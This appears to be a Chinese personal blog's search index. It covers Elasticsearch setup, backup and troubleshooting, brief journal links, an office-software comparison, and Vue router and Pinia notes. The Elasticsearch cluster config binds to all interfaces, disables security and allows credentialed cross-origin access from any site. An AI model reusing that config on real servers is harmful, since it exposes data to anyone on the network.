[{"categories":["blog"],"content":" 简介这里记录 elastic 的使用. ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 单点安装 wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add - sudo apt-get install apt-transport-https echo \"deb https://mirrors.aliyun.com/elasticstack/7.x/apt stable main\" | sudo tee /etc/apt/sources.list.d/elastic-7.x.list apt update -y apt install elasticsearch # 配置文件 vim /etc/elasticsearch/elasticsearch.yml #单节点添加 network.host: 0.0.0.0 discovery.type: single-node # 配置 /etc/sysctl.conf vm.max_map_count = 262144 sysctl -p # 启动并验证 systemctl enable elasticsearch --now curl -X GET \"localhost:9200/_cat/health?v\" ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#单点安装"},{"categories":["blog"],"content":" 集群部署集群部署只是在 elasticsearch.yml 的配置上有区别. 启动以后会自动服务发现/加入集群/rebalance 数据. vim /etc/elasticsearch/elasticsearch.yml # 集群名称，所有节点保持一致，同一网段会自动发现 cluster.name: es-cluster # 节点名称，一般为主机名 node-1、node-2、node-3 node.name: node-1 # 节点角色，master表示管理节点，data表示数据节点 node.roles: [master,data] # 数据存放路径 path.data: /data/elasticsearch/data # 日志存放路径 path.logs: /data/elasticsearch/logs # 绑定监听IP network.host: 0.0.0.0 # 设置端口 http.port: 9200 # 跨域相关设置 http.cors.enabled: true http.cors.allow-credentials: true http.cors.allow-origin: \"*\" # 节点发现. 每个节点的ip discovery.seed_hosts: [\"10.1.43.74:9300\",\"10.1.43.75:9300\",\"10.1.43.76:9300\"] # 集群初始化Master节点，会在第一次选举中进行计算.. 可以作为master的节点 cluster.initial_master_nodes: [\"10.1.43.74:9300\",\"10.1.43.75:9300\",\"10.1.43.76:9300\"] # 启用节点上Elastic Search的xpack安全功能 xpack.security.enabled: false # discovery.type默认是多节点 # discovery.type: multi-node ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#集群部署"},{"categories":["blog"],"content":" 启动Systemd 守护进程 [Unit] Description=es服务 Documentation=elastic文档 # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] User=es Environment=ES_JAVA_OPTS=\"-Xms4g -Xmx4g\" WorkingDirectory=/home/es/elasticsearch-7.17.3 ExecStart=/home/es/elasticsearch-7.17.3/bin/elasticsearch # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target Alias=es.service supervisor 守护进程 [program:es] command = /home/es/elasticsearch-7.17.3/bin/elasticsearch environment=ES_JAVA_OPTS=\"-Xms4g -Xmx4g\" user = es # 自动重启 autorestart = true # 启动失败的尝试次数 startretries = 3 # 进程20s没有退出，则判断启动成功 startsecs = 20 # 标准输出的文件路径 stdout_logfile = /data/logs/es-stdout.log # 日志文件最大大小 stdout_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stdout_logfile_backups = 5 # 标准输出的文件路径 stderr_logfile = /data/logs/es-stderr.log # 日志文件最大大小 stderr_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stderr_logfile_backups = 5 ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#启动"},{"categories":["blog"],"content":" 常用命令","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:5:0","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#常用命令"},{"categories":["blog"],"content":" 修改密码 cd /usr/share/elasticsearch/ # 自动生成密码 sudo bin/elasticsearch-setup-passwords auto # 自定义密码 sudo bin/elasticsearch-setup-passwords interactive ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:5:1","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#修改密码"},{"categories":["blog"],"content":" 备份/恢复创建一个备份仓库: # 创建一个backup仓库 # 配置了本地路径, 压缩, 1g分片, 备份和恢复速度限制(避免影响系统) curl -XPOST '{ip}:9200/_snapshot/backup' -H 'Content-Type: application/json' -d '{ \"type\": \"fs\", \"settings\": { \"location\": \"/data/task/elk/elasticsearch-7.6.2/back\", \"compress\": true, \"chunk_size\": \"1g\", \"max_snapshot_bytes_per_sec\": \"50m\", \"max_restore_bytes_per_sec\": \"50m\"}}' 备份: # 创建一个名为rx_20220823的快照 curl -XPUT '{ip}:9200/_snapshot/backup/rx_20220823?wait_for_completion=true' # 备份指定的索引 relalist_expert_group_member,relalist_expert_group_summary curl -XPUT '{ip}:9200/_snapshot/backup/rx_20220823?wait_for_completion=true' -H 'Content-Type: application/json' -d '{\"indices\": \"relalist_expert_group_member,relalist_expert_group_summary\"}' 恢复 curl -XPOST '{ip}:9200/_snapshot/backup/rx_20220823/_restore' -H 'Content-Type: application/json' -d'{ \"ignore_unavailable\": true, \"include_global_state\": false }' ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:5:2","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#备份恢复"},{"categories":["blog"],"content":" 问题定位参考 Elasticsearch 集群故障排查及修复指南-腾讯云开发者社区-腾讯云 查看集群状态 curl -XGET 'http://{Elasticsearch_IP}:9200/_cluster/state?pretty' 查看有问题的索引 GET _cat/indices?v\u0026health=red GET _cat/indices?v\u0026health=yellow GET _cat/indices?v\u0026health=green 查看问题原因, 分析 GET /_cat/shards?v\u0026h=n,index,shard,prirep,state,sto,sc,unassigned.reason,unassigned.details\u0026s=sto,index # 关注state, unassigned.reason 字段 如果是 allocation 分片问题. 进一步分析 my_index_003. GET /_cluster/allocation/explain { \"index\": \"my_index_003\", \"shard\": 0, \"primary\": false } # explanation会有具体的原因 ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:5:3","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#问题定位"},{"categories":["blog"],"content":" 优化","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:6:0","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#优化"},{"categories":["blog"],"content":" 写入优化 写入前副本为 0 refresh_interval 设置为 -1，禁用刷新机制 bulk 批量写入 恢复副本数和刷新间隔 尽量使用自动生成的 id ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:6:1","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#写入优化"},{"categories":["blog"],"content":" 查询优化 避免 * 和 ? 查询. 通配符查询会很慢 terms查询 是多个词条的查询. 减少这种查询 基于时间创建索引 不断调整分片的分布 默认主键分片 可以设置字段范围分片 字段 hash 分片 ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:6:2","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#查询优化"},{"categories":["blog"],"content":" 工具infini-console 可以帮助我们管理多个 es 集群, 查询修改等操作. version: \"3.5\" services: infini-console: image: infinilabs/console:latest ports: - 9000:9000 container_name: \"infini-console\" ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:7:0","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#工具"},{"categories":["blog"],"content":" 资料 ES详解 - 优化：ElasticSearch性能优化详解 | Java 全栈知识体系 ","date":"2024-04-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/:8:0","series":null,"tags":["blog","elastic"],"title":"elastic教程","uri":"/posts/%E7%AC%94%E8%AE%B0/elastic%E6%95%99%E7%A8%8B/#资料"},{"categories":["journal"],"content":"2024-04-14 日记","date":"2024-04-14","objectID":"/posts/%E6%97%A5%E8%AE%B0/2024-04-14/","series":null,"tags":["journal"],"title":"2024-04-14","uri":"/posts/%E6%97%A5%E8%AE%B0/2024-04-14/"},{"categories":["journal"],"content":"#fun/外面的世界 【必看！】任剑涛 | 2012年瑞信年会上的演讲，幽默风趣及透彻的分析，关于中国社会政治，穿越时空的洞见，精准预测20年！ - YouTube ","date":"2024-04-14","objectID":"/posts/%E6%97%A5%E8%AE%B0/2024-04-14/:0:0","series":null,"tags":["journal"],"title":"2024-04-14","uri":"/posts/%E6%97%A5%E8%AE%B0/2024-04-14/#"},{"categories":["journal"],"content":"2024-04-12 日记","date":"2024-04-12","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-12/","series":null,"tags":["journal"],"title":"2024-04-12","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-12/"},{"categories":["journal"],"content":"#fun/文章 科技爱好者周刊（第 296 期）：xz 后门的作者 Jia Tan 是谁？ - 阮一峰的网络日志 xz 后门漏洞的提交人. 很可能是一个东二时区的东欧, 中东, 北欧, 以色列或埃及人在伪装中国人/东亚人 XZ Backdoor: Times, damned times, and scams 日本法律婚后都要跟随男的性, 生育率低. 所以很多姓氏没有了. 2531 年所有日本人都会姓佐藤 sato Demographics Professor Warns that by 2531, Everyone in Japan Will be Named Sato | Spoon \u0026 Tamago ","date":"2024-04-12","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-12/:0:0","series":null,"tags":["journal"],"title":"2024-04-12","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-12/#"},{"categories":["journal"],"content":"2024-04-08 日记","date":"2024-04-08","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-08/","series":null,"tags":["journal"],"title":"2024-04-08","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-08/"},{"categories":["journal"],"content":"#fun/旅游助手 用得上 2024 年 4 月香港银行卡开户总结 - V2EX ","date":"2024-04-08","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-08/:0:0","series":null,"tags":["journal"],"title":"2024-04-08","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-08/#"},{"categories":["journal"],"content":"2024-04-06 日记","date":"2024-04-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-06/","series":null,"tags":["journal"],"title":"2024-04-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-06/"},{"categories":["journal"],"content":"#fun/外面的世界 我在印度最大的贫民窟生活了三天，一路经历相当震撼｜百国旅行第19国-印度（6）_哔哩哔哩_bilibili ","date":"2024-04-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-06/:0:0","series":null,"tags":["journal"],"title":"2024-04-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-06/#"},{"categories":["blog"],"content":" 简介记录一下我选择办公软件的方法. 为什么只有国内的? 因为海外的都要科学上网. 办公软件也应该是简单易用的. ","date":"2024-04-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%8A%9E%E5%85%AC%E8%BD%AF%E4%BB%B6/:1:0","series":null,"tags":["blog"],"title":"办公软件","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%8A%9E%E5%85%AC%E8%BD%AF%E4%BB%B6/#简介"},{"categories":["blog"],"content":" 内容 企业微信 收费 企业微信 免费版本额度低 不同功能, 按人数收费. 钉钉 收费 免费版可以 500 人. 1 年 9800. 所以是固定收费 增值服务 webhook 等等内容按使用量收费 钉钉开放平台 飞书 收费 版本对比 | 飞书 免费版本额度相对较高 按人数收费. 50/80/120 ","date":"2024-04-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%8A%9E%E5%85%AC%E8%BD%AF%E4%BB%B6/:2:0","series":null,"tags":["blog"],"title":"办公软件","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%8A%9E%E5%85%AC%E8%BD%AF%E4%BB%B6/#内容"},{"categories":["blog"],"content":" 总结 有添加微信用户或者后续添加微信用户的需求, 那么就企业微信. 所以如果是面向国内, 这是第一选择了. 如果面向互联网, 或者邮箱沟通. 那么接着看其他的. 愿意付费. 或者说有可能人数做多. 就选钉钉. 大而全, 连接支付宝, 阿里云. 飞书免费套餐东西更多. 没有微信需求, 还想白嫖就用飞书. ","date":"2024-04-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%8A%9E%E5%85%AC%E8%BD%AF%E4%BB%B6/:3:0","series":null,"tags":["blog"],"title":"办公软件","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%8A%9E%E5%85%AC%E8%BD%AF%E4%BB%B6/#总结"},{"categories":["journal"],"content":"2024-04-01 日记","date":"2024-04-01","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-01/","series":null,"tags":["journal"],"title":"2024-04-01","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-01/"},{"categories":["journal"],"content":"#fun/文章 linux 的早期故事 The early days of Linux [LWN.net] ","date":"2024-04-01","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-01/:0:0","series":null,"tags":["journal"],"title":"2024-04-01","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-04-01/#"},{"categories":["point"],"content":"UUID 是唯一标识符. 没有绝对唯一, 但可能性忽略不计. 103 万亿个版本 4 UUID 中找到重复项的概率是十亿分之一 通常是 8-4-4-4-12 格式. 0f8fad5b-d9cb-469f-a165-70867728950e 有很多的版本标准. csharp 的 Guid 符合 v4 标准 相关链接 Universally unique identifier - Wikipedia ","date":"2024-03-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/uuid/:0:0","series":null,"tags":["point","UUID"],"title":"UUID","uri":"/posts/%E7%AC%94%E8%AE%B0/point/uuid/#"},{"categories":["point"],"content":"vue 是一个流行的前端框架. ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/vue/:0:0","series":null,"tags":["point","Vue"],"title":"Vue","uri":"/posts/%E7%AC%94%E8%AE%B0/point/vue/#"},{"categories":["blog"],"content":" 简介个人学习 Vue 的手册. 开始前, 应该先搞定 前端迅速上手 里的 vue项目创建 和 vscode配置, ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:1:0","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#简介"},{"categories":["blog"],"content":" 语法/概念","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:0","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#语法概念"},{"categories":["blog"],"content":" 定义对象 Person export interface Person { id: number name: string age: number x?: string } type Persons = Array\u003cPerson\u003e ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:1","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#定义对象-person"},{"categories":["blog"],"content":" 路由 router 路由配置router.ts 文件内容 import { createRouter, createWebHistory } from 'vue-router' import HomeView from '@/views/HomeView.vue' const router = createRouter({ history: createWebHistory(import.meta.env.BASE_URL), routes: [ { path: '/', name: 'root', // 重定向到 /home redirect: '/home' }, { path: '/home', name: 'home', component: HomeView }, { path: '/about', name: 'about', // 懒加载 component: () =\u003e import('../views/AboutView.vue') } ] }) export default router 子路径嵌套 // 子路径 { path: '/home2', name: 'home2', component: HomeView, children: [ { name: 'p1' path: 'p1', component: Detail } ] }, 路由参数. 在路径 url 里传递参数. title? 说明 title 可以不传 routerlink 写法为 :to=\"{name: 'p1', params:{id: 1, title:2}}\" { path: '/home2', name: 'home2', component: HomeView, children: [ { name: 'p1' // 传递参数 path: 'p1/:id/:title?', component: Detail } ] }, props 是配合上面路由参数使用的. 原因是有时候只配置了路由, 无法使用 \u003cComponent a=\"1\"\u003e 传参 // 通过query传参的函数写法 props(route){ return route.query // 返回params不如用属性 props: true // return route.params } // 属性写法. 只能用来替代函数写法的 return route.params props: true // 对象写法 props: { id:1 title:2 } // 接收方 // defineProps(['id','title']) 链接 \u003c!-- 传字符串 --\u003e \u003cRouterLink replace :to=\"url\" active-class=\"active-link\"\u003e{{ index }}-{{ url }}\u003c/RouterLink\u003e \u003c!-- 传对象 --\u003e \u003cRouterLink :to=\"{name: 'name', query:{a:1,b:2}}\" active-class=\"active-link\"\u003e{{ index }}-{{ url }}\u003c/RouterLink\u003e 可以传递 url, 其实就是 path 路径 传递对象的话, 可以写 router 里面的 name, 用 query 传递 url 参数 replace 属性, 使用户无法使用浏览器的返回按钮去到上一个页面 css 内容 .active-link { background-color: skyblue; } 编程路由 import { useRouter } from \"vue-router\" const router = useRouter() // 这里的push可以传递RouterLink里的 to 值 router.push('/url1') ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:2","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#路由-router"},{"categories":["blog"],"content":" 路由 router 路由配置router.ts 文件内容 import { createRouter, createWebHistory } from 'vue-router' import HomeView from '@/views/HomeView.vue' const router = createRouter({ history: createWebHistory(import.meta.env.BASE_URL), routes: [ { path: '/', name: 'root', // 重定向到 /home redirect: '/home' }, { path: '/home', name: 'home', component: HomeView }, { path: '/about', name: 'about', // 懒加载 component: () =\u003e import('../views/AboutView.vue') } ] }) export default router 子路径嵌套 // 子路径 { path: '/home2', name: 'home2', component: HomeView, children: [ { name: 'p1' path: 'p1', component: Detail } ] }, 路由参数. 在路径 url 里传递参数. title? 说明 title 可以不传 routerlink 写法为 :to=\"{name: 'p1', params:{id: 1, title:2}}\" { path: '/home2', name: 'home2', component: HomeView, children: [ { name: 'p1' // 传递参数 path: 'p1/:id/:title?', component: Detail } ] }, props 是配合上面路由参数使用的. 原因是有时候只配置了路由, 无法使用 传参 // 通过query传参的函数写法 props(route){ return route.query // 返回params不如用属性 props: true // return route.params } // 属性写法. 只能用来替代函数写法的 return route.params props: true // 对象写法 props: { id:1 title:2 } // 接收方 // defineProps(['id','title']) 链接 {{ index }}-{{ url }} {{ index }}-{{ url }} 可以传递 url, 其实就是 path 路径 传递对象的话, 可以写 router 里面的 name, 用 query 传递 url 参数 replace 属性, 使用户无法使用浏览器的返回按钮去到上一个页面 css 内容 .active-link { background-color: skyblue; } 编程路由 import { useRouter } from \"vue-router\" const router = useRouter() // 这里的push可以传递RouterLink里的 to 值 router.push('/url1') ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:2","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#路由配置"},{"categories":["blog"],"content":" 路由 router 路由配置router.ts 文件内容 import { createRouter, createWebHistory } from 'vue-router' import HomeView from '@/views/HomeView.vue' const router = createRouter({ history: createWebHistory(import.meta.env.BASE_URL), routes: [ { path: '/', name: 'root', // 重定向到 /home redirect: '/home' }, { path: '/home', name: 'home', component: HomeView }, { path: '/about', name: 'about', // 懒加载 component: () =\u003e import('../views/AboutView.vue') } ] }) export default router 子路径嵌套 // 子路径 { path: '/home2', name: 'home2', component: HomeView, children: [ { name: 'p1' path: 'p1', component: Detail } ] }, 路由参数. 在路径 url 里传递参数. title? 说明 title 可以不传 routerlink 写法为 :to=\"{name: 'p1', params:{id: 1, title:2}}\" { path: '/home2', name: 'home2', component: HomeView, children: [ { name: 'p1' // 传递参数 path: 'p1/:id/:title?', component: Detail } ] }, props 是配合上面路由参数使用的. 原因是有时候只配置了路由, 无法使用 传参 // 通过query传参的函数写法 props(route){ return route.query // 返回params不如用属性 props: true // return route.params } // 属性写法. 只能用来替代函数写法的 return route.params props: true // 对象写法 props: { id:1 title:2 } // 接收方 // defineProps(['id','title']) 链接 {{ index }}-{{ url }} {{ index }}-{{ url }} 可以传递 url, 其实就是 path 路径 传递对象的话, 可以写 router 里面的 name, 用 query 传递 url 参数 replace 属性, 使用户无法使用浏览器的返回按钮去到上一个页面 css 内容 .active-link { background-color: skyblue; } 编程路由 import { useRouter } from \"vue-router\" const router = useRouter() // 这里的push可以传递RouterLink里的 to 值 router.push('/url1') ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:2","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#链接"},{"categories":["blog"],"content":" 路由 router 路由配置router.ts 文件内容 import { createRouter, createWebHistory } from 'vue-router' import HomeView from '@/views/HomeView.vue' const router = createRouter({ history: createWebHistory(import.meta.env.BASE_URL), routes: [ { path: '/', name: 'root', // 重定向到 /home redirect: '/home' }, { path: '/home', name: 'home', component: HomeView }, { path: '/about', name: 'about', // 懒加载 component: () =\u003e import('../views/AboutView.vue') } ] }) export default router 子路径嵌套 // 子路径 { path: '/home2', name: 'home2', component: HomeView, children: [ { name: 'p1' path: 'p1', component: Detail } ] }, 路由参数. 在路径 url 里传递参数. title? 说明 title 可以不传 routerlink 写法为 :to=\"{name: 'p1', params:{id: 1, title:2}}\" { path: '/home2', name: 'home2', component: HomeView, children: [ { name: 'p1' // 传递参数 path: 'p1/:id/:title?', component: Detail } ] }, props 是配合上面路由参数使用的. 原因是有时候只配置了路由, 无法使用 传参 // 通过query传参的函数写法 props(route){ return route.query // 返回params不如用属性 props: true // return route.params } // 属性写法. 只能用来替代函数写法的 return route.params props: true // 对象写法 props: { id:1 title:2 } // 接收方 // defineProps(['id','title']) 链接 {{ index }}-{{ url }} {{ index }}-{{ url }} 可以传递 url, 其实就是 path 路径 传递对象的话, 可以写 router 里面的 name, 用 query 传递 url 参数 replace 属性, 使用户无法使用浏览器的返回按钮去到上一个页面 css 内容 .active-link { background-color: skyblue; } 编程路由 import { useRouter } from \"vue-router\" const router = useRouter() // 这里的push可以传递RouterLink里的 to 值 router.push('/url1') ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:2","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#编程路由"},{"categories":["blog"],"content":" 全局传递/状态管理 pinia定义一个 store import { defineStore } from 'pinia' import axios from 'axios' import { computed, ref } from 'vue' export const useDogStore = defineStore('dog', { state() { return { urls: [ 'https://images.dog.ceo/breeds/pekinese/n02086079_10613.jpg', 'https://images.dog.ceo/breeds/cockapoo/bubbles1.jpg' ] } }, // 用于把state计算一下,字符串拼接一下来用 getters: { doubleUrls(state) { return state.urls.concat(state.urls) }, doubleUrls2: (state) =\u003e state.urls.concat(state.urls), doubleUrls3(): Array\u003cstring\u003e { return this.urls.concat(this.urls) } }, actions: { async addDog() { const { data: { message } } = await axios.get('https://dog.ceo/api/breeds/image/random') this.urls.push(message) } } }) // 组合式 // ref() 就是 state 属性 // computed() 就是 getters // function() 就是 actions export const useDog2Store = defineStore('dog', () =\u003e { let urls = ref([ 'https://images.dog.ceo/breeds/pekinese/n02086079_10613.jpg', 'https://images.dog.ceo/breeds/cockapoo/bubbles1.jpg' ]) const doubleUrls = computed(() =\u003e urls.value.concat(urls.value)) const doubleUrls2 = computed(() =\u003e urls.value.concat(urls.value)) const doubleUrls3 = computed(() =\u003e urls.value.concat(urls.value)) async function addDog2() { const { data: { message } } = await axios.get('https://dog.ceo/api/breeds/image/random') urls.value.push(message) } return { urls, doubleUrls, doubleUrls2, doubleUrls3, addDog2 } }) 读取 const dogStore = useDogStore() // store的解构用storeToRefs, storeToRefs只会处理数据,而不会处理store里的函数 const {urls} = storeToRefs(dogStore) \u003cimg v-for=\"url in dogStore.urls\" :key=\"url\" :src=\"url\" mode=\"scaleToFill\" /\u003e 修改 // 1 直接修改 dogStore.urls = ['1','2'] // 2 patch方式修改对象,一次提交多个修改 counterStore.$patch({ urls: ['1','2'] b: 4 }) // 3 就是在store定义里, 用actions修改 订阅 // 订阅 // mutate里有id和事件.没什么用. // state则可以拿到数据 counterStore.$subscribe((mutate, state) =\u003e { // 一旦数据发生了变化,就存起来 localStorage.setItem('counter', JSON.stringify(state.count)) }) ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:3","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#全局传递状态管理-pinia"},{"categories":["blog"],"content":" 信息传递 defineProps/父与子 父传子 使用props. 子传父 1: 父传子一个函数,子接收并带上参数来调用函数 // 父 \u003c子组件 :dataA=\"dataA\" @click=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 // 接收特定key,例如字符串 \u003c子组件 a=\"a\" b=\"b\"\u003e defineProps(['dataA','fangfa']) fangfa(1) // 接收父组件的Person对象 defineProps\u003c{dataA:Person}\u003e() // 可以不传 defineProps\u003c{dataA?:Person}\u003e() // 默认值 withDefaults(defineProps\u003c{dataA?:Person}\u003e(),{ dataA: ()=\u003e [{id: 1,name: \"ken\",age: 1}] }) emit 自定义事件/子传父只能子传父 2: 自定义一个函数名 haha, 传入一个函数 子组件接收特定名称, 然后 emit 传回去 // 父 \u003c子组件 @haha=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 \u003cbutton @click=\"emit('haha',a)\"\u003e\u003c/button\u003e var a = ref(1) const emit = defineEmits(['haha']) mitt 事件订阅传递/任意组件 import mitt from 'mitt' const emitter = mitt() // 监听 emitter.on('foo', e =\u003e console.log('foo', e) ) // 触发 emitter.emit('foo', { a: 'b' }) // 去掉所有事件 emitter.all.clear() unMounted(()=\u003e{ // 销毁的时候去掉这个 emitter.off('foo') }) v-model 底层原理/父与子关于 $event 如果是原始 html 对象, 例如 input . 那么 $event 就是 dom 元素, 需要去 target.value 获取值 如果是自己定义的事情或对象, 那么 $event 就是你传递的对象 // 父 // \u003cA-Input v-model=\"aa\"/\u003e 其实是下面的简写 \u003cA-Input :modelValue=\"username\" @update:modelValue=\"username = $event\"\u003e\u003c/A-Input\u003e let username = ref('ken') // 子 \u003cinput type=\"text\" :value=\"modelValue\" @input=\"emit('update:modelValue',(\u003cHTMLInput\u003e)$event.target.value)\"\u003e // 接收传入的值 defineProps(['modelValue']) // 接受传递的事件 const emit = defineEmits(['update:modelValue']) $attr 父传子父传子的时候, 如果子没有使用 defineProps 接收. 就会到子组件的 $attr 里. 常见于把用户的配置通过 attrs 传递到下层组件. 所以常见场景是: 二次封装组件 // 父 // {c:1,d:2} 等于 :c=\"1\" :d=\"2\" \u003cchild :a=\"a\" :b=\"func\" v-bind=\"{c:1,d:2}\"\u003e // 子 原封不动传递一下 \u003csun v-bind:\"$attr\"\u003e // 孙 直接可以接收到 defineProps([\"a\",\"func\"]) $refs 父传子 \u0026\u0026 $parent 子传父 // 父 给子一个ref \u003cchild ref=\"z\"\u003e // 拿到子 let z = ref() // 子暴露的都可以拿到 z.value.a = 2 // 自己的数据,也暴露出去 let q = ref(1) defineExpose({q}) // 子 暴露出去a a = ref(1) defineExpose({a}) // 通过$parent拿到父暴露的q console.log($parent.q) provide/inject 祖传祖辈向下一代传递 // 祖先 let qian = ref(1) provide('money',qian) // 